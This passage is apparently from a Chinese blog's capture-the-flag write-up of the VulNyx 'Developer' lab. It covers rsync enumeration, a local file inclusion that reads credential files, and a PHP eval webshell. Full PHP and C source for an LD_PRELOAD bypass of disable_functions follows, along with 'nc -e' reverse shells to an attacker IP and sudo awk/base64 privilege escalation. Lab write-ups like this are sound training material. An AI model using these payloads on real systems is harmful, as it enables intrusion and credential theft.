cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.93 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="rsync-信息收集">1.4. rsync 信息收集</h3>
+<blockquote>
+<p><a
+target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/873-pentesting-rsync">873
+- Pentesting Rsync | Chinese - Ht | HackTricks</a><br />
+<strong>rsync</strong>
+是一种用于在计算机和外部硬盘驱动器之间以及跨网络计算机之间高效 <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_transfer">传输</a> 和 <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_synchronization">同步</a> <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_file">文件</a>
+的实用程序，通过比较文件的 <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Timestamping_(computing)">修改时间</a>
+和大小来实现。<a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3">[3]</a>
+它通常在 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Unix-like">类 Unix</a>
+<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Operating_system">操作系统</a>
+上找到。rsync 算法是一种 <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Delta_encoding">增量编码</a>
+类型，用于最小化网络使用。<a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Zlib">Zlib</a> 可用于额外的 <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_compression">数据压缩</a>，<a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3">[3]</a>
+并且可以使用 <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Secure_Shell">SSH</a> 或 <a
+target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stunnel">stunnel</a>
+来提供安全性</p>
+</blockquote>
+<p>利用 LFI 读取配置文件
+<code>page=....//....//....//etc/rsyncd.conf</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">motd file = /etc/Rsyncd.motd</span><br><span class="line">lock file = /var/run/Rsync.lock</span><br><span class="line"><span class="built_in">log</span> file = /var/log/Rsyncd.<span class="built_in">log</span></span><br><span class="line">pid file = /var/run/Rsyncd.pid</span><br><span class="line">[developer_resource]</span><br><span class="line">path = /var/www/html/rsync_uploads</span><br><span class="line">comment = developer_resource</span><br><span class="line">uid = 0</span><br><span class="line">gid = 0</span><br><span class="line"><span class="built_in">read</span> only = no</span><br><span class="line">list = no</span><br><span class="line">auth <span class="built_in">users</span> = dev</span><br><span class="line">secrets file = /etc/rsyncd.secrets</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li><strong>motd file</strong>：指定了MOTD（Message of the
+Day）文件的路径。MOTD文件通常包含有关服务器的一些提示信息，这些信息在用户连接到rsync服务器时显示。<br />
+</li>
+<li><strong>lock
+file</strong>：指定了锁文件的路径。锁文件用于在运行时控制对资源的访问，防止并发访问冲突。<br />
+</li>
+<li><strong>log
+file</strong>：指定了日志文件的路径。rsync服务器会将相关日志信息记录到该文件中，用于跟踪服务器的活动和故障排除。<br />
+</li>
+<li><strong>pid file</strong>：指定了PID（Process
+ID）文件的路径。PID文件用于存储rsync服务器进程的进程ID，方便管理和监控服务器的运行状态。<br />
+</li>
+<li><strong>path</strong>：指定了共享资源的路径，即要共享的文件或目录的位置。<br />
+</li>
+<li><strong>comment</strong>：提供了对共享资源的简要描述或注释。<br />
+</li>
+<li><strong>uid</strong>和<strong>gid</strong>：指定了共享资源的所有者和所属组的用户ID和组ID。<br />
+</li>
+<li><strong>read
+only</strong>：指定了共享资源是否为只读。在这里设置为<code>no</code>，表示允许写入操作。<br />
+</li>
+<li><strong>list</strong>：指定了是否允许列出共享资源的内容。在这里设置为<code>no</code>，表示不允许列出。<br />
+</li>
+<li><strong>auth
+users</strong>：指定了允许访问该共享资源的认证用户列表。<br />
+</li>
+<li><strong>secrets
+file</strong>：指定了用于认证的密钥文件的路径，其中包含了用户名和密码的对应关系。</li>
+</ul>
+</blockquote>
+<p><code>page=....//....//....//etc/rsyncd.secrets</code> 得
+<code>dev:d3vs3cur3p4ss</code></p>
+<p>枚举共享文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av --list-only rsync://username@192.168.0.123/shared_name</span><br></pre></td></tr></table></figure>
+<p>经测 shared_name = developer_resource</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rsync -av rsync://dev@[fd15:4ba5:5a2b:1008:020c:29ff:fe63:1671]:873/developer_resource/</span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line">receiving incremental file list</span><br><span class="line">drwxrwxrwx          4,096 2023/04/29 10:01:00 .</span><br><span class="line"></span><br><span class="line">sent 20 bytes  received 42 bytes  4.59 bytes/sec</span><br><span class="line">total size is 0  speedup is 0.00</span><br></pre></td></tr></table></figure>
+<p>有写权限，尝试获取 shell</p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>上传 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av re_shell.php  rsync://dev@[fd15:4ba5:5a2b:1008:020c:29ff:fe63:1671]:873/developer_resource/</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012026669.png" /></p>
+<p>弹不了 shell</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012032404.png" /></p>
+<p>传个一句话木马和 phpinfo</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); </span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>蚁剑能正常连接，但终端不能执行命令</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012037321.png" /></p>
+<p>看 phpinfo 是 disable_functions 禁用了命令执行函数</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012042410.png" /></p>
+<p>disable_functions</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,<span class="built_in">exec</span>,passthru,shell_exec,proc_open,proc_get_status,proc_terminate,proc_close,virtual,popen,show_source,curl_multi_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcnt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>disable_functions 绕过总结及分析</strong><br />
+- <a
+target="_blank" rel="noopener" href="https://www.meetsec.cn/index.php/archives/44/">绕过php的disable_functions（上篇）</a><br />
+- <a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/DumpInfou/p/18023278">绕过disable_functions的限制
+- DumpInfou - 博客园</a><br />
+- <a
+target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#disablefunctions-rao-guo">PHP
+- Useful Functions &amp; disable_functions/open_basedir bypass | Chinese
+- Ht | HackTricks</a></p>
+</blockquote>
+<p>bypass_disablefunc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>bypass_disablefunc.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so
+传递具体执行的命令行信息<br />
+用命令 gcc -shared -fPIC bypass_disablefunc.c -o
+bypass_disablefunc_x64.so 将 bypass_disablefunc.c 编译为共享对象
+bypass_disablefunc_x64.so：<br />
+要根据目标架构编译成不同版本，在 x64
+的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上
+-m32 选项。</p>
+</blockquote>
+<p>用蚁剑把相关文件上传到 rsync_uploads 目录下</p>
+<p>反弹 shell</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.185/rsync_uploads/bypass_disablefunc.php?cmd=nc -e /bin/sh 192.168.159.174 4444&amp;outpath=/tmp/pwd&amp;sopath=/var/www/html/rsync_uploads/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012136485.png" /></p>
+<p>直接用蚁剑插件亦可，示例：</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012121485.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012121486.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012122085.png" /></p>
+<p>可正常执行命令了，可在终端执行反弹 shell 命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.159.174 8080</span><br></pre></td></tr></table></figure>
+<h3 id="mike-用户">2.2. mike 用户</h3>
+<p>基于反弹的 shell 提权，<code>sudo -l</code> 得
+<code>(mike) NOPASSWD: /usr/bin/awk</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u mike awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012140860.png" /></p>
+<p>获得 flag ：35ebf8232ad5f09adafd4856087b834b</p>
+<h3 id="james-用户">2.3. james 用户</h3>
+<p>mike 用户 <code>sudo -l</code> 得
+<code>(james) NOPASSWD: /usr/bin/base64</code> ，经测可从 james 的
+.bash_history 中读到 james 的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u james <span class="built_in">base64</span> <span class="string">&#x27;/home/james/.bash_history&#x27;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012147857.png" /></p>
+<p>得 passwd：j4m3$B1GM@n</p>
+<h3 id="root-用户">2.4. root 用户</h3>
+<p>ssh 登录 james</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh james@192.168.159.185</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012156415.png" /></p>
+<p>主目录有个 task.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_pts</span></span>()&#123;</span><br><span class="line">  /usr/bin/w --no-header james | /usr/bin/awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | /usr/bin/cut -d <span class="string">&quot;/&quot;</span> -f 2 | /usr/bin/grep <span class="string">&quot;5&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(echo $?)</span>&quot;</span> == <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/cat /root/.ssh/id_rsa &gt;/dev/pts/5</span><br><span class="line">  <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_pts</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>脚本的作用是检查用户<code>james</code>当前是否登录到终端号为5的终端。如果是，则将指定的SSH私钥（/root/.ssh/id_rsa）写入到终端号为5的终端中。</p>
+</blockquote>
+<p>task.sh 应该是个定时任务，ssh 登录 james 至 tty=5</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012159565.png" /></p>
+<p>拿到了 root 的私钥，利用私钥登录 root</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406012202195.png" /></p>
+<p>获得 root.txt : c0ab61161c8aca53480a82769b4781f3，查 crontab 可见
+task.sh 确实是定时任务</p>
+<h2 id="回顾">3. 回顾</h2>
+<p>pagecontact.php 中的过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>([<span class="string">&quot;../&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;mike&quot;</span>, <span class="string">&quot;james&quot;</span>, <span class="string">&quot;id_rsa&quot;</span>, <span class="string">&quot;authorized_keys&quot;</span>, <span class="string">&quot;user.txt&quot;</span>, <span class="string">&quot;root.txt&quot;</span>, <span class="string">&quot;var&quot;</span>, ], <span class="string">&quot;&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;page&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;/var/www/html/<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>防火墙对 IPv4 的扫描做了限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@developer:~<span class="comment"># iptables -L</span></span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">REJECT     tcp  --  anywhere             anywhere             tcp dpt:rsync reject-with tcp-reset</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination     </span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/06/01/VulNyx%20-%20Developer/" title="VulNyx - Developer">https://z9m8r8.github.io/2024/06/01/VulNyx - Developer/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息搜集</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/Fuzzing/" rel="tag"><i class="fa fa-tag"></i> Fuzzing</a>
+              <a href="/tags/VulNyx/" rel="tag"><i class="fa fa-tag"></i> VulNyx</a>
+              <a href="/tags/WebThemez-CMS/" rel="tag"><i class="fa fa-tag"></i> WebThemez CMS</a>
+              <a href="/tags/LFI/" rel="tag"><i class="fa fa-tag"></i> LFI</a>
+              <a href="/tags/IPv6/" rel="tag"><i class="fa fa-tag"></i> IPv6</a>
+              <a href="/tags/Rsync/" rel="tag"><i class="fa fa-tag"></i> Rsync</a>
+              <a href="/tags/disable-functions/" rel="tag"><i class="fa fa-tag"></i> disable_functions</a>
+              <a href="/tags/Awk/" rel="tag"><i class="fa fa-tag"></i> Awk</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/05/29/VulnOS%202/" rel="prev" title="VulnOS: 2">
+                  <i class="fa fa-angle-left"></i> VulnOS: 2
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">237k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">14:21</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/06/01/VulNyx%20-%20Developer/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
